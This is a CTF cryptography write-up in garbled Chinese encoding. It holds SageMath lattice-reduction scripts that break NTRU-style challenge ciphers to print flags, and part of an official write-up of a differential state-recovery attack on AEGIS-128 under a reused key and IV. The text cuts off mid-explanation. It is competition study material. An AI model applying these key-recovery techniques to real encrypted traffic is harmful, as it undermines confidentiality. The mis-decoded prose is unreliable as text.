22102*x^17 + 18006*x^16 + 3198*x^15 + 19024*x^14 + 2777*x^13 + 9252*x^12 + 9684*x^11 + 3604*x^10 + 7840*x^9 + 17573*x^8 + 11382*x^7 + 12726*x^6 + 6811*x^5 + 10104*x^4 + 7485*x^3 + 858*x^2 + 15100*x + 15860 h = 14443*x^52 + 10616*x^51 + 11177*x^50 + 24769*x^49 + 23510*x^48 + 23059*x^47 + 21848*x^46 + 24145*x^45 + 12420*x^44 + 1976*x^43 + 16947*x^42 + 7373*x^41 + 16708*x^40 + 18435*x^39 + 18561*x^38 + 21557*x^37 + 16115*x^36 + 7873*x^35 + 20005*x^34 + 11543*x^33 + 9488*x^32 + 2865*x^31 + 11797*x^30 + 2961*x^29 + 14944*x^28 + 22631*x^27 + 24061*x^26 + 9792*x^25 + 6791*x^24 + 10423*x^23 + 3534*x^22 + 26233*x^21 + 14223*x^20 + 15555*x^19 + 3381*x^18 + 23641*x^17 + 2697*x^16 + 11303*x^15 + 6030*x^14 + 7355*x^13 + 20693*x^12 + 1768*x^11 + 10059*x^10 + 27822*x^9 + 8150*x^8 + 5458*x^7 + 21270*x^6 + 22651*x^5 + 8381*x^4 + 2819*x^3 + 3987*x^2 + 8610*x + 6022 def inv_mod_prime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f))) def mul(f,g): return (f * g) % (x^n-1) def bal_mod(f,q): g = list(((f[i] + q//2) % q) - q//2 for i in range(n)) return Zx(g) def decrypt(e,pri_key): f,fp = pri_key a = bal_mod(mul(e,f),q) d = bal_mod(mul(a,fp),p) return d def get_key(): for j in range(2 * n): try: f = Zx(list(M[j][:n])) fp = inv_mod_prime(f,p) return (f,fp) except: pass return (f,f) M = matrix(ZZ, 2*n, 2*n) hh = h.list() for i in range(n): M[i,i] = 1 for i in range(n,2*n): M[i,i] = q for i in range(n): for j in range(n): M[i,j+n] = hh[(n-i+j) % n] M = M.LLL() key = get_key() l = decrypt(e, key).list() flag = bytes(l) print(flag) son_of_NTRU # è™½ç„¶è¿™é“é¢˜ç›®è¯´çš„ä¸æ˜¯NTRUï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥å‘ç°é¢˜ç›®çš„ä»£ç å’ŒNTRUåŸºæœ¬ç±»ä¼¼\n#! /bin/bash/env python3 from random import randrange from Crypto.Util.number import * from gmpy2 import invert def gcd(a,b): while b: a,b = b,a%b return a def generate(): p = getPrime(1024) while True: f = randrange(1,(p//2)**(0.5)) g = randrange((p//4)**(0.5),(p//2)**(0.5)) if gcd(f,p)==1 and gcd(f,g)==1: break h = (invert(f,p)*g)%p return h,p,f,g def encrypt(m,h,p): assert m\u0026lt;(p//4)**(0.5) r = randrange(1,(p//2)**(0.5)) c = (r*h+m)%p return c h,p,f,g = generate() from flag import flag c = encrypt(bytes_to_long(flag),h,p) print(\u0026#34;h = {}\u0026#34;.format(h)) print(\u0026#34;p = {}\u0026#34;.format(p)) print(\u0026#34;c = {}\u0026#34;.format(c)) é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨\rSoreat_uå¸ˆå‚…çš„è„šæœ¬è¿›è¡Œè§£å¯†\nfrom Crypto.Util.number import * def GaussLatticeReduction(v1, v2): while True: if v2.norm() \u0026lt; v1.norm(): v1, v2 = v2, v1 m = round( v1*v2 / v1.norm()^2 ) if m == 0: return (v1, v2) v2 = v2 - m*v1 h = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004 p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469 c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700 # Construct lattice. v1 = vector(ZZ, [1, h]) v2 = vector(ZZ, [0, p]) m = matrix([v1,v2]); # Solve SVP. shortest_vector = m.LLL()[0] # shortest_vector = GaussLatticeReduction(v1, v2)[0] f, g = shortest_vector print(f, g) f = abs(f) g = abs(g) # Decrypt. a = f*c % p % g m = a * inverse_mod(f, g) % g print(long_to_bytes(m)) XCTFåä¸ºäº‘ä¸“é¢˜èµ› å®˜æ–¹Writeup # é¢˜ç›®æºç ï¼šhttps://github.com/huaweictf/xctf_huaweicloud-qualifier-2020\nå¤ªæ¹–æ¯ # Aegis # æ•´ä¸ªå‡ºé¢˜çš„é¢˜ç›®å‚è€ƒäº†googlectf 2020 Oracleçš„é¢˜ç›®ã€‚ç”±äºè€ƒè™‘åˆ°æ¯”èµ›æ—¶é•¿çš„é—®é¢˜ï¼ˆå…¶å®æ˜¯ä½œè€…æ¯”è¾ƒèœï¼‰ï¼ŒåŸºæœ¬ä¸Šæ˜¯å°†å…¶ä¸­çš„ä¸€ä¸ªè€ƒç‚¹æ‹¿äº†å‡ºæ¥ä¿®æ”¹æˆäº†å½“å‰çš„é¢˜ç›®ã€‚é’ˆå¯¹é‚£ä¸ªé¢˜ç›®æ¯”è¾ƒå®Œæ•´çš„è§£æ³•å¯ä»¥å‚è€ƒ[è¿™é‡Œ](\rhttps://github.com/nguyenduyhieukma/CTF-Writeups/blob/master/Google CTF Quals/2020/oracle/oracle-solution.ipynb) è¿™ä¸ªåœ°æ–¹ä¹Ÿæœ‰è¿™ä¸ªç®—æ³•çš„æ¯”è¾ƒè¯¦ç»†çš„è§£é‡Šã€‚\nç®—æ³•ç®€ä»‹ # AEGIS ç®—æ³•æ˜¯ä¸€ç§AEADï¼ˆauthenticated encryption with associated data å…³è”æ•°æ®çš„è®¤è¯åŠ å¯†ï¼‰ åŠ å¯†ã€‚è¿™ç§ç®—æ³•é™¤äº†èƒ½å¤Ÿæä¾›å¯¹æŒ‡å®šæ˜æ–‡çš„åŠ å¯†ï¼Œè¿˜èƒ½å¤Ÿæä¾›å¯¹æœªåŠ å¯†çš„å…³è”æ•°æ®çš„å®Œæ•´æ€§ä¿è¯ã€‚è¯´é€šä¿—ä¸€ç‚¹å°±æ˜¯ï¼Œé™¤äº†èƒ½å¤Ÿå¯¹æˆ‘ä»¬å‘é€çš„éœ€è¦åŠ å¯†çš„ä¿¡æ¯è¿›è¡ŒåŠ å¯†ï¼ŒåŒæ—¶è¿˜æä¾›äº†å¯¹æˆ‘ä»¬æ˜æ–‡ä¿¡æ¯çš„é•¿åº¦å’Œæ—¶é—´è¿™äº›æœªåŠ å¯†çš„æ•°æ®è¿›è¡ŒéªŒè¯çš„æ‰‹æ³•ã€‚å½“æˆ‘ä»¬å°†å¯†æ–‡è§£å¼€çš„æ—¶å€™ï¼Œä¼šåŒ…å«ä¸€ä¸ªä¹‹å‰æä¾›çš„æ˜æ–‡ä¿¡æ¯çš„éªŒè¯é€”å¾„ï¼Œä¾‹å¦‚èƒ½å¤Ÿå¾—åˆ°é•¿åº¦çš„ä¸€ä¸ªéªŒè¯æ•°æ®ï¼Œæˆ‘ä»¬æ­¤æ—¶å°±èƒ½å¤Ÿç”¨è¿™ä¸ªæ•°æ®éªŒè¯æˆ‘ä»¬ä¹‹å‰æœªåŠ å¯†çš„é•¿åº¦çš„å®Œæ•´æ€§ã€‚ åœ¨é¢˜ç›®ä¸­ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ä¸¤ç§ä¸åŒçš„å€¼:ptå’Œaad\nct, tag = cipher.encrypt(iv, aad, pt) æ­¤å¤„çš„ptè¡¨ç¤ºçš„å°±æ˜¯æˆ‘ä»¬é€šå¸¸æ„ä¹‰ä¸‹çš„æ˜æ–‡ï¼Œè€Œè¿™é‡Œçš„aadï¼Œå®é™…ä¸Šå°±æ˜¯authenticated associated dataï¼Œè®¤è¯å…³è”æ•°æ®ã€‚è¿™ä¸ªæ•°æ®ä¼šå‚ä¸åˆ°æ•´ä¸ªåŠ å¯†è¿‡ç¨‹ä¸­ï¼Œç”¨äºç”ŸæˆçŠ¶æ€ã€‚ ctè¡¨ç¤ºçš„æ˜¯åŠ å¯†åçš„å¯†æ–‡ï¼Œtagåˆ™æ˜¯åœ¨åŠ å¯†å®Œæˆåçš„çŠ¶æ€ç®—æ³•ä¸­ç”Ÿæˆçš„æ ¡éªŒæ ‡ç­¾ï¼Œå¯ä»¥ç”¨æ¥æ ¡éªŒaadçš„å€¼æ˜¯å¦å‘ç”Ÿå˜åŒ–ã€‚\nå…³äºaadçš„éªŒè¯ç®—æ³•å¯ä»¥åˆæ­¥çœ‹ä¸€ä¸‹åŠ å¯†è¿‡ç¨‹ã€‚\ndef encrypt(self, iv, ad, msg): S = self.initialize(iv) S = self.update_aad(S, ad) S, ct = self.raw_encrypt(S, msg) tag = self.finalize(S, len(ad) * 8, len(msg) * 8) return ct, tag def decrypt(self, iv, ad, ct, tag): S = self.initialize(iv) S = self.update_aad(S, ad) S, pt = self.raw_decrypt(S, ct) tag2 = self.finalize(S, len(ad) * 8, len(ct) * 8) if tag2 != tag: raise Exception(\u0026#39;Invalid tag\u0026#39;) return pt ç”±äºåœ¨åŠ å¯†æˆ–è€…è§£å¯†è¿‡ç¨‹ä¸­ï¼Œaadå€¼å‚ä¸äº†æœ€åˆåŠ å¯†çŠ¶æ€çš„ç”Ÿæˆï¼Œæ‰€ä»¥aadå€¼åœ¨ä¸å˜çš„å‰æä¸‹ï¼ŒåŠ è§£å¯†ä¸­çŠ¶æ€ï¼ˆStateï¼‰å˜åŒ–æ˜¯ä¸€è‡´çš„ï¼Œæœ€åé˜¶æ®µç®—å‡ºæ¥çš„ tag2 ç†è®ºä¸Šä¼šå’Œæˆ‘ä»¬ä¼ å…¥çš„tagä¸€è‡´ï¼Œå°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹æ¥ä¿è¯aadçš„å®Œæ•´æ€§ã€‚\nAegis128çš„ç®—æ³• # æƒ³è¦æ˜ç™½å½“å‰çš„ç®—æ³•çš„æ¼æ´ï¼Œéœ€è¦å…ˆçœ‹æ˜ç™½å½“å‰åŠ å¯†ç®—æ³•åŸç†ã€‚æ•´ä¸ªåŠ å¯†ä¸­ä¼šç»´æŠ¤ä¸€ä¸ªçŠ¶æ€çš„æ¦‚å¿µï¼Œç„¶åæˆ‘ä»¬éœ€è¦åŠ å¯†çš„å†…å®¹ä¼šç±»ä¼¼ä¸€äº›å‘é‡æ¥å½±å“æ•´ä¸ªçŠ¶æ€ï¼Œä»è€Œå¯¹æ˜æ–‡å®ŒæˆåŠ å¯†ã€‚é‚£ä¹ˆé¦–å…ˆï¼Œä¸ºäº†æ›´åŠ æ–¹ä¾¿çš„æè¿°åŠ å¯†è¿‡ç¨‹ï¼Œæˆ‘ä»¬éœ€è¦é¢„å…ˆå®šä¹‰ä¸€äº›å˜é‡:\nS[i]: ç¬¬iæ­¥æ›´æ–°çš„çŠ¶æ€\rS[i][j]: ç¬¬iæ­¥çŠ¶æ€ä¸­ï¼Œç¬¬jå—128bitåˆ†ç»„\r^: çŠ¶æ€ä¹‹é—´å¼‚æˆ–è¿ç®—\r\u0026amp;: çŠ¶æ€çš„ä¸è¿ç®—\rconst0: 128bitçš„ä¸€ä¸ªé­”æ•°ï¼ˆ0x000101020305080d1522375990e97962ï¼‰\rconst1: 128bitçš„ä¸€ä¸ªé­”æ•°ï¼ˆ0xdb3d18556dc22ff12011314273b528ddï¼‰ Aegisæœ‰ä¸‰ç§ä¸åŒçš„åŠ å¯†æ–¹å¼ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æ˜¯128ç‰ˆæœ¬\nçŠ¶æ€æ›´æ–° StatusUpdate # AegisåŠ å¯†ç®—æ³•ä¸­ï¼Œä¸€ä¸ªé‡è¦çš„æ¦‚æ“ä½œå°±æ˜¯çŠ¶æ€æ›´æ–°StateUpdateã€‚å½“è¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿçš„æ—¶å€™ï¼Œå…¶æ›´æ–°ç®—æ³•å¦‚ä¸‹:\nm: ä¸€ä¸ª128bitçš„ä¿¡æ¯\rS[i+1] = StatueUpdate(S[i], m)\rS[i+1][0] = S[i][0]^AESRound(S[i][4])^m\rS[i+1][1] = S[i][1]^AESRound(S[i][0])\rS[i+1][2] = S[i][2]^AESRound(S[i][1])\rS[i+1][3] = S[i][3]^AESRound(S[i][2])\rS[i+1][4] = S[i][4]^AESRound(S[i][3]) è¿™ä¸ªæ›´æ–°è¿‡ç¨‹çš„æµç¨‹å¤§è‡´å¯ä»¥å†™ä½œå¦‚ä¸‹:\nåˆå§‹åŒ–è¿‡ç¨‹ # æ•´ä¸ªç®—æ³•çš„æ›´æ–°ï¼Œé¦–å…ˆä½¿ç”¨å¯†é’¥K128ä¸åˆå§‹åŒ–å‘é‡IV128è¿›è¡Œä¸€äº›è¿ç®—ï¼Œæœ€ç»ˆäº§ç”Ÿæ•´ä¸ªç®—æ³•çš„åˆå§‹çŠ¶æ€ã€‚æ­¤æ—¶çš„K128ä¸ºæˆ‘ä»¬åŠ å¯†ç®—æ³•çš„å¯†é’¥ï¼ŒIV128ä¸ºä¸€ä¸ªå¯å˜çš„å‘é‡ã€‚æ•´ä¸ªç”Ÿæˆçš„è¿‡ç¨‹å¯ä»¥å†™ä½œ:\ndef initialize(self, iv): k_iv = _xor(self.key, iv) S = [k_iv, self.const_1, self.const_0, _xor(self.key, self.const_0), _xor(self.key, self.const_1)] for _ in range(5): S = self.state_update(S, self.key) S = self.state_update(S, k_iv) return S æ ¹æ®ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä½œ:\nS[-5][0] = k128^iv128\rS[-5][1] = const_1\rS[-5][2] = const_0\rS[-5][3] = k128^const_0\rS[-5][4] = k128^const_1\rfor i in range(5)\rS[-5+i+1] = StatueUpdate(S[-4+i], k128)\rS[-5+i+1] = StatueUpdate(S[-4+i+1], k128^iv128) è¿™é‡Œå†™ä½œ-4ï¼Œä¸»è¦æ˜¯ä¸ºäº†å¯ä»¥åŒæ­¥ï¼Œä¿è¯æˆ‘ä»¬åœ¨èµ·å§‹çŠ¶æ€ä¸‹ä¸ºS[0]ã€‚\nAegis ä¸­çš„AES # æˆ‘ä»¬æ¥ä»”ç»†çœ‹ä¸€ä¸‹Aegisä¸­çš„AESç®—æ³•ã€‚é¦–å…ˆæ¥çœ‹åˆ°å®˜æ–¹ç»™å‡ºçš„aes:\ndef aes_enc(s: block, round_key: block) -\u0026gt; block: \u0026#34;\u0026#34;\u0026#34;Performs the AESENC operation with tables.\u0026#34;\u0026#34;\u0026#34; t0 = (te0[s[0]] ^ te1[s[5]] ^ te2[s[10]] ^ te3[s[15]]) t1 = (te0[s[4]] ^ te1[s[9]] ^ te2[s[14]] ^ te3[s[3]]) t2 = (te0[s[8]] ^ te1[s[13]] ^ te2[s[2]] ^ te3[s[7]]) t3 = (te0[s[12]] ^ te1[s[1]] ^ te2[s[6]] ^ te3[s[11]]) s = _block_from_ints([t0, t1, t2, t3]) return _xor(s, round_key) te0[s[0]],te1[s[1]]è¿™äº›å°±ç›¸å½“äºæ˜¯sç›’ï¼ŒæŒ‰ç…§s0,s5,s10,s15è¿™ç§é¡ºåºå–å€¼ç›¸å½“äºæ˜¯è¡Œä½ç§»(shift)ï¼Œå–å€¼è¿›è¡Œå¼‚æˆ–å°±ç›¸å½“äºæ˜¯åˆ—æ··æ·†(mix_column)ã€‚æ•´ä¸ªè¿‡ç¨‹æˆ‘ä»¬å¤§è‡´å†™ä¸‹æ¥å°±æ˜¯:\nAES(m) = mix_column(shift(Sbox(m))) å®é™…ä¸Šå°±æ˜¯AESåŠ å¯†ç®—æ³•ä¸­ï¼Œé™¤å»å¯†é’¥äº¤æ¢è¿™ä¸€æ­¥ä¹‹åçš„å‰©ä½™æ­¥éª¤ã€‚å¹¶ä¸”æˆ‘ä»¬çŸ¥é“ï¼Œæ•´ä¸ªAegisåŠ å¯†ä¸­ï¼ŒAESå‚ä¸çš„æ–¹å¼ä¸º:\nif j != 0\rS[i+1][j] = AES(S[i][(j+4)%5])\relse\rS[i+1][j] = AES(S[i][(j+4)%5]) ^ mi äºæ˜¯æˆ‘ä»¬å¯ä»¥ç®€å†™æˆå¦‚ä¸‹çš„è¿ç®—:\nif j != 0\rC = AES(M)\relse\rC = AES(M)^m é‚£å‡è®¾æ­¤æ—¶ï¼Œæˆ‘ä»¬çš„Må‘ç”Ÿäº†ä¸€äº›å˜åŒ–ï¼Œæˆ‘ä»¬è¿™é‡Œå°†å˜åŒ–çš„å·®å€¼å†™ä½œdMï¼Œæ­¤æ—¶æœ‰\nM1 = M^dM å¯¹M1çš„åŠ å¯†å°±å¯ä»¥å†™æˆ:\nif j != 0\rC1 = AES(M1) = AES(M^dM)\relse\rC1 = AES(M1)^m = AES(M^dM)^m C1ã€Cå‡ä¸ºæˆ‘ä»¬å¯ä»¥å¾—åˆ°çš„å…·ä½“å€¼ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡æ§åˆ¶åŠ å¯†çš„å†…å®¹ï¼Œä½¿å¾—dMå¯æ§ï¼ˆä¹‹åä¼šå±•ç¤ºï¼‰æˆ‘ä»¬å°±æœ‰æœºä¼šèƒ½å¤Ÿæ¨å¯¼å‡ºMçš„å€¼ã€‚å…·ä½“çš„åšæ³•å¦‚ä¸‹:\n1. å°†C1^Cï¼Œæ­¤æ—¶æ¶ˆé™¤äº†mçš„å½±å“ï¼Œå­˜åœ¨å…¬å¼\rC1^C = AES(M^dM)^AES(M)\r2. AES = mix_column(shift(Sbox(m)))\rç„¶è€Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œmix_columnæœ¬èº«ä¹Ÿæ˜¯å¼‚æˆ–è¿ç®—å¾—åˆ°çš„ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´æ»¡è¶³\rmix_column(x)^mix_column(x^dx) = mix_column(dx)\rè€Œshiftåªæ˜¯ä½ç§»æ“ä½œï¼Œæ‰€ä»¥ä¹Ÿå¯æ»¡è¶³\rshift(x)^shift(x^dx) = shift(dx)\ræ‰€ä»¥å®é™…ä¸Šå¯ä»¥å†™ä½œ\rC1^C = AES(M^dM)^AES(M) = Sbox(M^dM)^Sbox(M) ç„¶è€Œå®é™…ä¸Šï¼ŒSboxè¿ç®—æ˜¯å¯ä»¥è¢«çˆ†ç ´çš„ã€‚å‡è®¾æˆ‘ä»¬èƒ½çŸ¥é“dMï¼Œé‚£æˆ‘ä»¬åªéœ€è¦çˆ†ç ´16ä¸ªå­—èŠ‚ï¼Œæœ€ç»ˆå°±èƒ½æ¨å¯¼å‡ºMçš„å€¼\nAegisçš„åŠ å¯†è¿‡ç¨‹ # ç”±äºAegis128åŠ å¯†ä¸­çš„æœ€å°å•ä½ä¸º128bitï¼Œä¹Ÿå°±æ˜¯16å­—èŠ‚ï¼Œæ‰€ä»¥åŠ å¯†ä¹‹å‰ä¼šå°†å½“å‰çš„æ˜æ–‡å¡«å……è‡³16çš„å€æ•°ã€‚ä¹‹åï¼Œæ¯16ä¸ªå­—èŠ‚çš„åŠ å¯†æ‰‹æ³•å¦‚ä¸‹:\nfor i in range(0, len16(msg), 16):\rCi = (S2 \u0026amp; S3) ^ S1 ^ S4 ^ mi\rSi+1 = StatusUpdate(Si, mi) æ³¨æ„ä¸€ä¸ªç»†èŠ‚ï¼Œè¿™è¾¹ä¸ºäº†é˜²æ­¢S0çš„å‚ä¸å¯¼è‡´åŠ å¯†ç®—æ³•è¢«åˆ©ç”¨ï¼Œæ‰€ä»¥åœ¨åŠ å¯†è¿‡ç¨‹ä¸­æ•…æ„æŠ›å¼ƒäº†S0ã€‚ åŠ å¯†ç»“æŸä¹‹åï¼Œæ›´æ–°å½“å‰çŠ¶æ€å—ã€‚è¿™é‡Œå‚è€ƒä¸€ä¸ªå›¾å¯èƒ½ä¼šæ›´åŠ æ¸…æ™°:\np[i][0]`ä¸ºæˆ‘ä»¬æŒ‰ç…§16å­—èŠ‚åˆ†ç»„çš„ç¬¬iç»„æ˜æ–‡è¾“å…¥ï¼Œ`k[0][0]`è¡¨ç¤ºç¬¬0ç»„çš„æ˜æ–‡åŠ å¯†å¾—åˆ°çš„å¯†æ–‡ã€‚è¿™é‡Œæ³¨æ„ï¼Œæˆ‘ä»¬çš„æ˜æ–‡çš„**ç¬¬0ç»„å®é™…ä¸Šå‚ä¸äº†ç¬¬ä¸€ç»„å¯†æ–‡çš„ç”Ÿæˆï¼Œå¹¶ä¸”è¿˜å½±å“äº†ç¬¬1ç»„çš„çŠ¶æ€**ã€‚å›¾ä¸Šçš„çº¢æ¡†è¡¨ç¤ºçš„å°±æ˜¯ï¼Œå½“æˆ‘ä»¬çš„è¾“å…¥`p[0][0]`å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œå®é™…ä¸Šä¼šå½±å“çš„çŠ¶æ€ã€‚ä»å›¾ä¸Šå¯çŸ¥ï¼Œå½“è¾“å…¥`p[0][0]`å˜åŒ–çš„æ—¶å€™ï¼Œå®é™…ä¸Šä¼šå½±å“çš„æ˜¯:`s[1][0], s[2][0], s[2][1], k[2][0]ï¼ˆè¿™ä¸ªåœ°æ–¹åº”è¯¥å†™ä½œk[2]ï¼Œå¯èƒ½æ˜¯å›¾ç‰‡ä½œè€…å†™é”™äº†ï¼‰ å‚è€ƒæºç ï¼š\ndef raw_encrypt(S, msg): ct_blocks = [] for i in range(0, len(msg), 16): blk = msg[i:i+16] mask = Aegis128.output_mask(S) if len(blk) \u0026lt; 16: mask = mask[:len(blk)] p = blk + bytes(16 - len(blk)) else: p = blk ct_blocks.append(_xor(mask, blk)) S = Aegis128.state_update(S, p) return S, b\u0026#39;\u0026#39;.join(ct_blocks) def encrypt(self, iv, ad, msg): S = self.initialize(iv) S = self.update_aad(S, ad) S, ct = self.raw_encrypt(S, msg) tag = self.finalize(S, len(ad) * 8, len(msg) * 8) return ct, tag Ageisçš„æ¼æ´ç‚¹ # åŠ å¯†æµç¨‹ä¸­ï¼ŒIVå’Œkeyéƒ½ä¸ä¼šæ›´æ–°ï¼Œå¹¶ä¸”åŠ å¯†7æ¬¡ã€‚æœ€ç»ˆç›®çš„æ˜¯è®©æˆ‘ä»¬æ±‚å‡ºå½“ä½¿ç”¨äº†ç©ºçš„aadè¿›è¡Œäº†StateUpdateçŠ¶æ€åå¾—åˆ°çš„åˆå§‹çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯çŠ¶æ€S[1]ã€‚ è¿™ä¸€ç±»IVã€keyä¸å‘ç”Ÿå˜åŒ–çš„é¢˜ç›®ï¼Œå…¶å®ä¼ è¾¾çš„ä¸€ä¸ªå«ä¹‰å°±æ˜¯åŠ å¯†ç®—æ³•æœ¬èº«æ˜¯ä¸å˜çš„ï¼Œå³æ˜¯è¯´å¯¹äºåŠ å¯†ç®—æ³•C = F(m)ï¼Œè¿™ä¸ªFæ˜¯ä¸å˜é‡ï¼Œè€Œæ­¤æ—¶çš„må’ŒCéƒ½æ˜¯å·²çŸ¥çš„ï¼Œå°±æœ‰æœºä¼šæ„é€ åˆé€‚çš„mï¼Œä»è€Œæ³„éœ²Fä¸­çš„ä¸€äº›ä¿¡æ¯\nç¬¬ä¸€æ­¥æ³„éœ² # è¿™é‡Œé‡æ–°å±•ç¤ºä¸€ä¸‹ä¹‹å‰ç”¨æ¥æè¿°åŠ å¯†çš„é‚£å¼ å›¾ï¼Œè¿™é‡Œæˆ‘ä»¬ç€é‡å…³æ³¨çš„æ˜¯å˜åŒ–å€¼:\nå¯ä»¥çœ‹åˆ°ï¼Œå½“p[0][0]å˜åŒ–çš„æ—¶å€™ï¼Œs[1][0], s[2][0], s[2][1], k[2]å‡ä¼šæ”¶åˆ°å½±å“ã€‚è¿™é‡Œæˆ‘ä»¬å¤ä¹ ä¸€ä¸‹è¿™å‡ ä¸ªå€¼çš„å…³ç³»:\nï¼ˆ1ï¼‰k[2] = (S[2][2] \u0026amp; S[2][3]) ^ S[2][1] ^ S[2][4] ^ p[2][0]\rï¼ˆ2ï¼‰k[1] = (S[1][2] \u0026amp; S[1][3]) ^ S[1][1] ^ S[1][4] ^ p[1][0]\rï¼ˆ3ï¼‰S[2][0] = AESRound(S[1][4])^S[1][0]^p[1][0]\rï¼ˆ4ï¼‰S[1][0] = AESRound(S[0][4])^S[0][0]^p[0][0] ç”±äºï¼ˆ2ï¼‰æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼ŒS[1][0]å¹¶ä¸å‚ä¸åˆ°æ•´ä¸ªåŠ å¯†è¿‡ç¨‹ä¸­ï¼Œæ‰€ä»¥ä¸ä¼šå¯¹åŠ å¯†æœ¬èº«æœ‰å½±å“ï¼Œå› æ­¤k[1]çš„å€¼ä¸å‘ç”Ÿå˜åŒ– æ­¤æ—¶ç”Ÿæˆçš„å¯†æ–‡kd[2]è™½ç„¶å‘ç”Ÿäº†å˜åŒ–ï¼Œä½†æ˜¯å…¶å˜åŒ–ä»…ä»…æ˜¯å› ä¸ºS[2][1]å‘ç”Ÿäº†å˜åŒ–ï¼Œå› ä¸ºåœ¨StateUpdateä¸­ï¼Œåªæœ‰S[2][1]ä¼šå—åˆ°è¾“å…¥çš„å½±å“ï¼Œå…¶ä»–çš„çŠ¶æ€å¹¶ä¸æ”¶åˆ°å½“å‰çš„è¾“å…¥çŠ¶æ€å½±å“: è¿™é‡Œæˆ‘ä»¬å°†å˜åŒ–åçš„på†™ä½œdpï¼Œå¹¶ä¸”æ»¡è¶³dtp = dp^pï¼Œå‘ç”Ÿäº†ç›¸åº”å˜åŒ–çš„å˜é‡éƒ½åŠ ä¸Šdçš„å‰ç¼€ï¼Œäºæ˜¯æ­¤æ—¶æœ‰ï¼š\nkd[2] ^ k[2] = S[2][1] ^ Sd[2][1] = AESRound(S[1][0])^AESRound(Sd[1][0]) æ­¤æ—¶æˆ‘ä»¬çš„kd[2] ^ k[2]æ˜¯å·²çŸ¥é‡ã€‚è€Œæˆ‘ä»¬æ­¤æ—¶çŸ¥é“\nï¼ˆ5ï¼‰AESRound(S[1][0])^AESRound(Sd[1][0]) = Sbox(S[1][0])^Sbox(Sd[1][0])\rï¼ˆ6ï¼‰S[1][0] = AES(S[0][4]) ^ S[0][0] ^ p[0][0] ç”±äºï¼ˆ6ï¼‰ä¸­ï¼ŒS[0][0], S[0][4]åœ¨IVå’Œkeyä¸å˜çš„æƒ…å†µä¸‹ï¼Œå³ä½¿æˆ‘ä»¬æ›´æ”¹pä¹Ÿä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ‰€ä»¥å®é™…ä¸Šå¯ä»¥æ¨å‡º\nï¼ˆ7ï¼‰Sd[1][0]^S[1][0] = p[0][0]^dp[0][0] = dtp[0][0]\r====\u0026gt; Sd[1][0] = S[1][0] ^ dtp[0][0] äºæ˜¯æˆ‘ä»¬å¯ä»¥å°†ï¼ˆ5ï¼‰æ¨åˆ°æˆ\nï¼ˆ8ï¼‰Sbox(S[1][0])^Sbox(Sd[1][0]) = Sbox(S[1][0])^Sbox(S[1][0]^dpt[0][0]) = kd[2]^k[2] åœ¨ï¼ˆ8ï¼‰è¿™ä¸ªç®—å¼ä¸­ï¼Œdptï¼Œkdï¼Œkä¸‰ä¸ªå€¼æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œäºæ˜¯æˆ‘ä»¬åªéœ€è¦çˆ†ç ´S[1][0]ä¸­çš„16å­—èŠ‚å³å¯ã€‚ ä¸è¿‡ç»è¿‡æµ‹è¯•ï¼Œç›´æ¥çˆ†ç ´æ˜¯å­˜åœ¨å¤šè§£çš„æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¢åŠ ä¸€ä¸ªå˜åŒ–ï¼Œä¹Ÿå°±æ˜¯dpt2ï¼Œä¸¤æ¬¡çš„ç»“æœç»¼åˆè€ƒè™‘ã€‚ç»è¿‡æµ‹è¯•ï¼Œè¿™ç§æ–¹å¼èƒ½å¤Ÿå¾—åˆ°å”¯ä¸€çš„S[1][0]\ndef resolve(dk_1, ds_1, dk_2, ds_2): # here we check the tmpk = aes.bytes2matrix(dk_1) aes.inv_mix_columns(tmpk) aes.inv_shift_rows(tmpk) d_k1 = aes.matrix2bytes(tmpk) tmpk = aes.bytes2matrix(dk_2) aes.inv_mix_columns(tmpk) aes.inv_shift_rows(tmpk) d_k2 = aes.matrix2bytes(tmpk) # result should be unique res = bytearray(16) # try to bruce it for i in range(16): x1 = set() for c in range(256): if aes.s_box[c] ^ aes.s_box[c^ds_1[i]] == d_k1[i] and aes.s_box[c] ^ aes.s_box[c^ds_2[i]] == d_k2[i]: x1.add(c) res[i] = x1.pop() assert(len(res) == 16) return bytes(res) è¿›ä¸€æ­¥æ³„éœ² # ç”±äºæˆ‘ä»¬æœ‰7æ¬¡é€šä¿¡æœºä¼šï¼Œç›®å‰å¯ä»¥å¦‚ä¸‹å®‰æ’\nç¬¬ä¸€æ¬¡ï¼šæˆ‘ä»¬ä¸€å£æ°”é€šä¿¡è·å¾—k[0],k[1],k[2],k[3],k[4]ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å°†pè®¾ç½®ä¸ºå…¨0ï¼Œè¿™æ ·çš„è¯èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬ä¹‹åæ›´åŠ æ–¹ä¾¿çš„è¿›è¡Œè®¡ç®— ç¬¬äºŒã€ä¸‰æ¬¡ï¼š å¾—åˆ°S[1][0] ç¬¬å››ã€äº”æ¬¡ï¼š 